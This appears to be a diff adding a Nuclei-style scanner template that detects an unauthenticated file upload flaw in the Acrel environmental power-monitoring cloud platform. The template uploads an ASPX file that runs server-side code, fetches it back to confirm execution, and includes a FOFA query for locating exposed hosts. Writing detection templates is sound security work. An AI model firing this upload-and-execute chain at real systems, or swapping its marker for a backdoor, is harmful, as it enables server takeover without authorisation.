@@ -1,0 +1,48 @@
+http:
+    - extractors:
+        - group: 1
+          internal: true
+          name: uploadfile
+          part: body
+          regex:
+            - ([a-zA-Z0-9-]+\.aspx)
+          type: regex
+      raw:
+        - |
+          POST /Enterprise/UpLoadPic HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1RnTaskmR
+
+          ------WebKitFormBoundaryRDazwgc1RnTaskmR
+          Content-Disposition: form-data; name="file"; filename="{{username}}.aspx"
+
+          <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+          ------WebKitFormBoundaryRDazwgc1RnTaskmR--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - pboyjnnrfipmplsukdeczudsefxmywe
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /UpLoad/Temp/{{uploadfile}} HTTP/1.1
+          Host: {{Hostname}}
+id: ankerui-UpLoadPic-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="myCss/phone.css"
+        安科瑞环保用电监管云平台 UpLoadPic 接口存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 安科瑞环保用电监管云平台 UpLoadPic 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/FUf5x6k_J28lGBWYfM7vtw
+    severity: high
+    tags:
+        - 安科瑞环保用电监管云平台
+variables:
+    username: '{{to_lower(rand_base(6))}}'
